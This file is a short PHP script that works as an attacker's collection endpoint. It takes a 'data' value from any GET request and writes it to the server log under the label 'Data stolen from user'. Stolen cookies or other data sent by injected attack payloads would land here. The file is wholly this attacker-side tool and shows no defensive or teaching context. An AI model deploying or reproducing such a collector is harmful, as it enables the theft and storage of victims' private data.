<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    error_log("Data stolen from user: " . $_GET['data']);
}
?>
